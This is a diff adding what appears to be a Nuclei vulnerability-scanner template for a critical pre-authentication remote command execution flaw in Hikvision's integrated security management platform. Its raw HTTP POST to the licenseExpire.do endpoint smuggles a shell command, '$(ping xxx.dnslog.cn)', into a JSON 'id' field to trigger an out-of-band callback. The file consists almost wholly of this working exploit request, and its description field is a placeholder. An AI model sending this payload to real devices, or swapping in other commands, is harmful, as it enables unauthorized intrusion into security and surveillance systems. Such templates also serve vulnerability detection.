@@ -1,0 +1,21 @@
+id: Hikvision_34
+
+info:
+  name: 海康威视综合安防管理平台licenseExpire存在前台远程命令执行漏洞
+  author: Douliyoutang
+  severity: critical
+  description: description
+  reference:
+  tags: Hikvision
+
+http:
+  - raw:
+      - |+
+        POST /portal/cas/login/ajax/licenseExpire.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+        {"type":"environment","operate":"","machines":{"id":"$(ping+xxx.dnslog.cn)"}
+
+
